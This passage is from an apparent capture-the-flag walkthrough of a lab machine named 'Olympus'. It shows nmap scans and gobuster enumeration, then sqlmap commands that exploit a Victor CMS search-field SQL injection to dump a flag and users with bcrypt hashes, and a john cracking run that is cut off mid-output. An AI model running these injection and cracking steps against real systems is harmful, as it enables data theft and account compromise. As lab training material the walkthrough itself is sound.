</span></span><span style=display:flex><span>Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-09-23 14:38 EEST
</span></span><span style=display:flex><span>Initiating Ping Scan at 14:38
</span></span><span style=display:flex><span>Scanning 10.10.203.170 <span style=color:#f92672>[</span><span style=color:#ae81ff>2</span> ports<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Completed Ping Scan at 14:38, 0.07s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> total hosts<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Initiating Connect Scan at 14:38
</span></span><span style=display:flex><span>Scanning olympus.thm <span style=color:#f92672>(</span>10.10.203.170<span style=color:#f92672>)</span> <span style=color:#f92672>[</span><span style=color:#ae81ff>65535</span> ports<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Discovered open port 22/tcp on 10.10.203.170
</span></span><span style=display:flex><span>Discovered open port 80/tcp on 10.10.203.170
</span></span><span style=display:flex><span>Completed Connect Scan at 14:39, 34.39s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>65535</span> total ports<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> olympus.thm <span style=color:#f92672>(</span>10.10.203.170<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.069s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>65533</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE
</span></span><span style=display:flex><span>22/tcp open  ssh
</span></span><span style=display:flex><span>80/tcp open  http
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 34.51 seconds
</span></span></code></pre></div><p>Perform aggressive <code>nmap</code> scan to enable OS detection, default scripts and version detection on the found ports.</p><ul><li>Command: <code>sudo nmap -A -sC -p 22,80 -v 10.10.203.170</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ sudo nmap -A -sC -p 22,80 -v 10.10.203.170
</span></span><span style=display:flex><span>Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-09-23 14:39 EEST                                                      
</span></span><span style=display:flex><span>NSE: Loaded <span style=color:#ae81ff>155</span> scripts <span style=color:#66d9ef>for</span> scanning.                                                                                 
</span></span><span style=display:flex><span>NSE: Script Pre-scanning.                                                                                             
</span></span><span style=display:flex><span>Initiating NSE at 14:39
</span></span><span style=display:flex><span>Completed NSE at 14:39, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 14:39
</span></span><span style=display:flex><span>Completed NSE at 14:39, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 14:39
</span></span><span style=display:flex><span>Completed NSE at 14:39, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating Ping Scan at 14:39
</span></span><span style=display:flex><span>Scanning 10.10.203.170 <span style=color:#f92672>[</span><span style=color:#ae81ff>4</span> ports<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Completed Ping Scan at 14:39, 0.11s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> total hosts<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Initiating SYN Stealth Scan at 14:39
</span></span><span style=display:flex><span>Scanning olympus.thm <span style=color:#f92672>(</span>10.10.203.170<span style=color:#f92672>)</span> <span style=color:#f92672>[</span><span style=color:#ae81ff>2</span> ports<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Discovered open port 80/tcp on 10.10.203.170
</span></span><span style=display:flex><span>Discovered open port 22/tcp on 10.10.203.170
</span></span><span style=display:flex><span>Completed SYN Stealth Scan at 14:39, 0.11s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>2</span> total ports<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Initiating Service scan at 14:39
</span></span><span style=display:flex><span>Scanning <span style=color:#ae81ff>2</span> services on olympus.thm <span style=color:#f92672>(</span>10.10.203.170<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Completed Service scan at 14:39, 6.19s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>2</span> services on <span style=color:#ae81ff>1</span> host<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Initiating OS detection <span style=color:#f92672>(</span>try <span style=color:#75715e>#1) against olympus.thm (10.10.203.170)</span>
</span></span><span style=display:flex><span>Retrying OS detection <span style=color:#f92672>(</span>try <span style=color:#75715e>#2) against olympus.thm (10.10.203.170)</span>
</span></span><span style=display:flex><span>Initiating Traceroute at 14:39
</span></span><span style=display:flex><span>Completed Traceroute at 14:39, 0.07s elapsed
</span></span><span style=display:flex><span>Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 14:39
</span></span><span style=display:flex><span>Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 14:39, 0.00s elapsed
</span></span><span style=display:flex><span>NSE: Script scanning 10.10.203.170.
</span></span><span style=display:flex><span>Initiating NSE at 14:39
</span></span><span style=display:flex><span>Completed NSE at 14:40, 2.14s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 14:40
</span></span><span style=display:flex><span>Completed NSE at 14:40, 0.28s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 14:40
</span></span><span style=display:flex><span>Completed NSE at 14:40, 0.00s elapsed
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> olympus.thm <span style=color:#f92672>(</span>10.10.203.170<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.068s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>3072</span> 0a:78:14:04:2c:df:25:fb:4e:a2:14:34:80:0b:85:39 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> 8d:56:01:ca:55üá©üá™e1:7c:64:04:ce:e6:f1:a5:c7:ac <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> 1f:c1:be:3f:9c:e7:8e:24:33:34:a6:44:af:68:4c:3c <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.41 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>|_http-title: Olympus
</span></span><span style=display:flex><span>|_http-favicon: Unknown favicon MD5: ED726E098473BFA7523153F761D2232F
</span></span><span style=display:flex><span>| http-methods: 
</span></span><span style=display:flex><span>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.41 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Warning: OSScan results may be unreliable because we could not find at least <span style=color:#ae81ff>1</span> open and <span style=color:#ae81ff>1</span> closed port
</span></span><span style=display:flex><span>Aggressive OS guesses: Linux 3.1 <span style=color:#f92672>(</span>95%<span style=color:#f92672>)</span>, Linux 3.2 <span style=color:#f92672>(</span>95%<span style=color:#f92672>)</span>, AXIS 210A or <span style=color:#ae81ff>211</span> Network Camera <span style=color:#f92672>(</span>Linux 2.6.17<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>94%<span style=color:#f92672>)</span>, ASUS RT-N56U WAP <span style=color:#f92672>(</span>Linux 3.4<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>93%<span style=color:#f92672>)</span>, Linux 3.16 <span style=color:#f92672>(</span>93%<span style=color:#f92672>)</span>, Linux 2.6.32 <span style=color:#f92672>(</span>92%<span style=color:#f92672>)</span>, Linux 2.6.39 - 3.2 <span style=color:#f92672>(</span>92%<span style=color:#f92672>)</span>, Linux 3.1 - 3.2 <span style=color:#f92672>(</span>92%<span style=color:#f92672>)</span>, Linux 3.2 - 4.9 <span style=color:#f92672>(</span>92%<span style=color:#f92672>)</span>, Linux 3.5 <span style=color:#f92672>(</span>92%<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>No exact OS matches <span style=color:#66d9ef>for</span> host <span style=color:#f92672>(</span>test conditions non-ideal<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Uptime guess: 26.420 days <span style=color:#f92672>(</span>since Sun Aug <span style=color:#ae81ff>28</span> 04:35:21 2022<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Network Distance: <span style=color:#ae81ff>2</span> hops
</span></span><span style=display:flex><span>TCP Sequence Prediction: Difficulty<span style=color:#f92672>=</span><span style=color:#ae81ff>260</span> <span style=color:#f92672>(</span>Good luck!<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>IP ID Sequence Generation: All zeros
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>TRACEROUTE <span style=color:#f92672>(</span>using port 80/tcp<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>HOP RTT      ADDRESS
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span>   67.93 ms 10.8.0.1 <span style=color:#f92672>(</span>10.8.0.1<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span>   68.02 ms olympus.thm <span style=color:#f92672>(</span>10.10.203.170<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>NSE: Script Post-scanning.
</span></span><span style=display:flex><span>Initiating NSE at 14:40
</span></span><span style=display:flex><span>Completed NSE at 14:40, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 14:40
</span></span><span style=display:flex><span>Completed NSE at 14:40, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 14:40
</span></span><span style=display:flex><span>Completed NSE at 14:40, 0.00s elapsed
</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style=display:flex><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 13.12 seconds
</span></span><span style=display:flex><span>           Raw packets sent: <span style=color:#ae81ff>60</span> <span style=color:#f92672>(</span>4.236KB<span style=color:#f92672>)</span> | Rcvd: <span style=color:#ae81ff>42</span> <span style=color:#f92672>(</span>3.136KB<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>If we navigate to port <code>80</code>, the page is not loading so we can <code>curl</code>, in verbose mode, to identify the domain name of the machine.<br></p><ul><li>Command: <code>curl -v 10.10.203.170</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ curl -v 10.10.203.170
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>&lt; Location: http://olympus.thm
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span></code></pre></div><p>We found that the domain name is <code>olympus.thm</code>, so we can add it and its IP address in <code>/etc/hosts</code> file.<br>The contents of <code>/etc/hosts</code> should look like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ cat /etc/hosts
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>10.10.203.170   olympus.thm
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span></code></pre></div><p>Then, we can navigate to <code>http://olympus.thm</code> and see the web page.<br>Now, we can brute force the website for directories using <code>gobuster</code>.<br></p><ul><li>Command: <code>gobuster dir -u http://olympus.thm/ -x php -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 50</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ gobuster dir -u http://olympus.thm/ -x php -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 50
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>                                                       
</span></span><span style=display:flex><span>Gobuster v3.1.0                                                                                                       
</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@firefart<span style=color:#f92672>)</span>                                                         
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>                                                       
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:                     http://olympus.thm/                                                                      
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Method:                  GET                                                                                      
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:                 <span style=color:#ae81ff>50</span>                                                                                       
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt                           
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Negative Status codes:   <span style=color:#ae81ff>404</span>                                                                                      
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:              gobuster/3.1.0                                                                           
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Extensions:              php                                                                                      
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:                 10s
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2022/09/22 22:33:40 Starting gobuster in directory enumeration mode
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>/.htpasswd            <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 276<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/.htpasswd.php        <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 276<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/.htaccess            <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 276<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/.hta                 <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 276<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/.htaccess.php        <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 276<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/.hta.php             <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 276<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/index.php            <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 1948<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/index.php            <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 1948<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/javascript           <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 315<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://olympus.thm/javascript/<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/phpmyadmin           <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 276<span style=color:#f92672>]</span>                                     
</span></span><span style=display:flex><span>/server-status        <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 276<span style=color:#f92672>]</span>                                     
</span></span><span style=display:flex><span>/static               <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 311<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://olympus.thm/static/<span style=color:#f92672>]</span>    
</span></span><span style=display:flex><span>/~webmaster           <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 315<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://olympus.thm/~webmaster/<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>                                                                                    
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2022/09/22 22:33:58 Finished
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span></code></pre></div><p>The most interesting directory is <code>~webmaster</code>, so we can go to the URL: <code>http://olympus.thm/~webmaster/</code><br></p><h2 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2><h3 id=flag-1>Flag 1<a hidden class=anchor aria-hidden=true href=#flag-1>#</a></h3><p>After trying the <code>searchsploit</code> command for exploits on Victor CMS, we identify <code>Victor CMS 1.0 - 'Search' SQL Injection</code> (<code>php/webapps/48734.txt</code>), which is a SQL Injection on <code>search</code> parameter. There is an exploit command with <code>sqlmap</code> tool. We first list the available databases, then its tables, then the columns of <code>flag</code> table, and finally dump the flag column.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ searchsploit victor
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Victor CMS 1.0 - <span style=color:#e6db74>&#39;Search&#39;</span> SQL Injection                                             | php/webapps/48734.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>geobour98@kali:~$ searchsploit -m php/webapps/48734.txt
</span></span><span style=display:flex><span>geobour98@kali:~$ sqlmap -u <span style=color:#e6db74>&#34;http://olympus.thm/~webmaster/search.php&#34;</span> --data<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;search=1337*&amp;submit=&#34;</span> --random-agent -v <span style=color:#ae81ff>3</span> --batch --dbs
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>available databases <span style=color:#f92672>[</span>6<span style=color:#f92672>]</span>:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> information_schema
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> mysql
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> olympus
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> performance_schema
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> phpmyadmin
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> sys
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>geobour98@kali:~$ sqlmap -u <span style=color:#e6db74>&#34;http://olympus.thm/~webmaster/search.php&#34;</span> --data<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;search=1337*&amp;submit=&#34;</span> --random-agent -v <span style=color:#ae81ff>3</span> --batch -D olympus --tables
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Database: olympus
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#ae81ff>6</span> tables<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>+------------+
</span></span><span style=display:flex><span>| categories |
</span></span><span style=display:flex><span>| chats      |
</span></span><span style=display:flex><span>| comments   |
</span></span><span style=display:flex><span>| flag       |
</span></span><span style=display:flex><span>| posts      |
</span></span><span style=display:flex><span>| users      |
</span></span><span style=display:flex><span>+------------+
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>geobour98@kali:~$ sqlmap -u <span style=color:#e6db74>&#34;http://olympus.thm/~webmaster/search.php&#34;</span> --data<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;search=1337*&amp;submit=&#34;</span> --random-agent -v <span style=color:#ae81ff>3</span> --batch -D olympus -T flag --columns
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Database: olympus
</span></span><span style=display:flex><span>Table: flag
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#ae81ff>1</span> column<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>+--------+--------------+
</span></span><span style=display:flex><span>| Column | Type         |
</span></span><span style=display:flex><span>+--------+--------------+
</span></span><span style=display:flex><span>| flag   | varchar<span style=color:#f92672>(</span>255<span style=color:#f92672>)</span> |
</span></span><span style=display:flex><span>+--------+--------------+
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>geobour98@kali:~$ sqlmap -u <span style=color:#e6db74>&#34;http://olympus.thm/~webmaster/search.php&#34;</span> --data<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;search=1337*&amp;submit=&#34;</span> --random-agent -v <span style=color:#ae81ff>3</span> --batch -D olympus -T flag -C flag --dump
</span></span><span style=display:flex><span>Database: olympus
</span></span><span style=display:flex><span>Table: flag
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#ae81ff>1</span> entry<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>+---------------------------+
</span></span><span style=display:flex><span>| flag                      |
</span></span><span style=display:flex><span>+---------------------------+
</span></span><span style=display:flex><span>|        <span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>         |
</span></span><span style=display:flex><span>+---------------------------+
</span></span></code></pre></div><h3 id=flag-2>Flag 2<a hidden class=anchor aria-hidden=true href=#flag-2>#</a></h3><p>There is another interesting table found from <code>sqlmap</code>, which is <code>users</code> and in the <code>user_email</code> column we can find another domain used <code>chat.olympus.thm</code>, so we add this too to <code>/etc/hosts</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ sqlmap -u <span style=color:#e6db74>&#34;http://olympus.thm/~webmaster/search.php&#34;</span> --data<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;search=1337*&amp;submit=&#34;</span> --random-agent -v <span style=color:#ae81ff>3</span> --batch -D olympus -T users --columns
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Database: olympus
</span></span><span style=display:flex><span>Table: users
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#ae81ff>9</span> columns<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>+----------------+--------------+
</span></span><span style=display:flex><span>| Column         | Type         |
</span></span><span style=display:flex><span>+----------------+--------------+
</span></span><span style=display:flex><span>| randsalt       | varchar<span style=color:#f92672>(</span>255<span style=color:#f92672>)</span> |
</span></span><span style=display:flex><span>| user_email     | varchar<span style=color:#f92672>(</span>255<span style=color:#f92672>)</span> |
</span></span><span style=display:flex><span>| user_firstname | varchar<span style=color:#f92672>(</span>255<span style=color:#f92672>)</span> |
</span></span><span style=display:flex><span>| user_id        | int          |
</span></span><span style=display:flex><span>| user_image     | text         |
</span></span><span style=display:flex><span>| user_lastname  | varchar<span style=color:#f92672>(</span>255<span style=color:#f92672>)</span> |
</span></span><span style=display:flex><span>| user_name      | varchar<span style=color:#f92672>(</span>255<span style=color:#f92672>)</span> |
</span></span><span style=display:flex><span>| user_password  | varchar<span style=color:#f92672>(</span>255<span style=color:#f92672>)</span> |
</span></span><span style=display:flex><span>| user_role      | varchar<span style=color:#f92672>(</span>255<span style=color:#f92672>)</span> |
</span></span><span style=display:flex><span>+----------------+--------------+
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>geobour98@kali:~$ sqlmap -u <span style=color:#e6db74>&#34;http://olympus.thm/~webmaster/search.php&#34;</span> --data<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;search=1337*&amp;submit=&#34;</span> --random-agent -v <span style=color:#ae81ff>3</span> --batch -D olympus -T users -C randsalt,user_email,user_name,user_password --dump
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Database: olympus
</span></span><span style=display:flex><span>Table: users
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#ae81ff>3</span> entries<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>+----------+------------------------+------------+--------------------------------------------------------------+
</span></span><span style=display:flex><span>| randsalt | user_email             | user_name  | user_password                                                |
</span></span><span style=display:flex><span>+----------+------------------------+------------+--------------------------------------------------------------+
</span></span><span style=display:flex><span>| &lt;blank&gt;  | prometheus@olympus.thm | prometheus | $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C |
</span></span><span style=display:flex><span>| dgas     | root@chat.olympus.thm  | root       | $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK |
</span></span><span style=display:flex><span>| dgas     | zeus@chat.olympus.thm  | zeus       | $2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC |
</span></span><span style=display:flex><span>+----------+------------------------+------------+--------------------------------------------------------------+
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>geobour98@kali:~$ cat /etc/hosts
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>10.10.203.170   olympus.thm chat.olympus.thm
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span></code></pre></div><p>If we navigate to <code>http://chat.olympus.thm</code> we see a login page. Before, we found some hashes so it&rsquo;s time to crack them. We will use <code>john</code> for the first hash <code>$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C</code>, which is saved in file <code>hash</code>, with <code>rockyou.txt</code> wordlist.<br></p><ul><li>Command: <code>john -w=/usr/share/wordlists/rockyou.txt hash --format=bcrypt</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ john -w<span style=color:#f92672>=</span>/usr/share/wordlists/rockyou.txt hash --format<span style=color:#f92672>=</span>bcrypt
</span></span><span style=display:flex><span>Using default input encoding: UTF-8                                                                                   
</span></span><span style=display:flex><span>Loaded <span style=color:#ae81ff>1</span> password hash <span style=color:#f92672>(</span>bcrypt <span style=color:#f92672>[</span>Blowfish 32/64 X3<span style=color:#f92672>])</span>                                                                   
</span></span><span style=display:flex><span>Cost <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>iteration count<span style=color:#f92672>)</span> is <span style=color:#ae81ff>1024</span> <span style=color:#66d9ef>for</span> all loaded hashes                                                                
</span></span><span style=display:flex><span>Will run <span style=color:#ae81ff>12</span> OpenMP threads                                                                                            
</span></span><span style=display:flex><span>Press <span style=color:#e6db74>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#66d9ef>for</span> status                                                         
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>       <span style=color:#f92672>(</span>?<span style=color:#f92672>)</span>                                                                                                  
</span></span><span style=display:flex><span>1g 0:00:00:07 DONE <span style=color:#f92672>(</span>2022-09-22 23:33<span style=color:#f92672>)</span> 0.1386g/s 569.2p/s 569.2c/s 569.2C/s 19861986..candies                          
